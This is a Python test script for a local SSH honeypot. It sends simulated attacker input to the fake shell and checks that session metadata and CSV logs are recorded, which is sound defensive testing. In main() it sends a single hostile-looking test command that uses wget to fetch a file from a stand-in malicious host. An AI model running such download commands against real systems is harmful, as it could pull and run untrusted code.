import socket, time, pathlib, json, csv
from datetime import datetime

def recv_until_prompt(s, timeout=10.0):
    s.settimeout(1.0)
    end = time.time() + timeout
    buf = b""
    while time.time() < end:
        try:
            chunk = s.recv(4096)
            if not chunk:
                return buf.decode(errors='ignore')
            buf += chunk
            if b'root@fakehost:~#' in buf or b'Attempted download' in buf:
                return buf.decode(errors='ignore')
        except Exception:
            # keep waiting
            time.sleep(0.1)
            continue
    return buf.decode(errors='ignore')

def verify_session_files():
    """Verify session files were created and check for CSV."""
    print("\n" + "="*60)
    print("VERIFYING SESSION FILES")
    print("="*60)
    
    try:
        sessions = sorted(pathlib.Path('data/sessions').iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        if not sessions:
            print("[✗] NO_SESSION_FOUND")
            return False
        
        latest = sessions[0]
        print(f"[✓] Latest session: {latest.name}")
        
        # Check meta.json
        meta_path = latest / 'meta.json'
        if meta_path.exists():
            meta = json.load(open(meta_path,'r',encoding='utf-8'))
            print(f"\n[✓] meta.json found:")
            print(f"    Session ID: {meta.get('session_id', 'N/A')}")
            print(f"    Source IP: {meta.get('src_ip', 'N/A')}")
            print(f"    Instance: {meta.get('instance', 'default')}")
        
        # Check sessions.csv
        csv_path = latest / 'sessions.csv'
        if csv_path.exists():
            print(f"[✓] sessions.csv found in {latest.name}")
            with open(csv_path, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                rows = list(reader)
                print(f"    Rows: {len(rows)}")
        else:
            print(f"[!] sessions.csv not yet created (may be async)")
        
        return True
    except Exception as e:
        print(f"[✗] Error: {repr(e)}")
        return False

def verify_aggregated_csv():
    """Verify aggregated CSV output."""
    print("\n" + "="*60)
    print("VERIFYING AGGREGATED CSV")
    print("="*60)
    
    try:
        csv_path = pathlib.Path('output/honeypot_sessions.csv')
        
        if not csv_path.exists():
            print(f"[!] Not yet created: {csv_path}")
            print("    Run: python merge_sessions.py")
            return False
        
        print(f"[✓] Found: {csv_path}")
        print(f"    Size: {csv_path.stat().st_size} bytes")
        print(f"    Modified: {datetime.fromtimestamp(csv_path.stat().st_mtime)}")
        
        with open(csv_path, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            rows = list(reader)
        
        print(f"    Total rows: {len(rows)}")
        if rows:
            print(f"    Columns: {list(rows[0].keys())[:5]}...")
        
        # Show instance distribution
        if rows and 'instance' in rows[0]:
            instances = {}
            for row in rows:
                inst = row.get('instance', 'unknown')
                instances[inst] = instances.get(inst, 0) + 1
            print(f"\n[✓] Sessions by instance:")
            for inst, count in sorted(instances.items()):
                print(f"    {inst}: {count}")
        
        return True
    except Exception as e:
        print(f"[✗] Error: {repr(e)}")
        return False

def main():
    print("="*60)
    print("HONEYPOT TEST CLIENT - MULTI-VM VERIFICATION")
    print("="*60)
    
    # Test connection
    print("\n[1] Testing honeypot connection...")
    s = socket.socket()
    s.settimeout(20)
    s.connect(('127.0.0.1',2222))
    print("[✓] BANNER:", s.recv(4096).decode(errors='ignore')[:50])
    
    # send wget
    s.send(b'wget http://malicious.example/x\n')
    out = recv_until_prompt(s, timeout=8.0)
    print("[✓] AFTER_WGET response received")
    
    # now send ls
    s.send(b'ls -la\n')
    out2 = recv_until_prompt(s, timeout=4.0)
    print("[✓] LS_REPLY response received")
    s.close()

    # Verify session files
    print("\n[2] Verifying per-session files...")
    verify_session_files()
    
    # Verify aggregated CSV
    print("\n[3] Verifying aggregated CSV...")
    verify_aggregated_csv()
    
    print("\n" + "="*60)
    print("TEST COMPLETE")
    print("="*60)

if __name__ == '__main__':
    main()
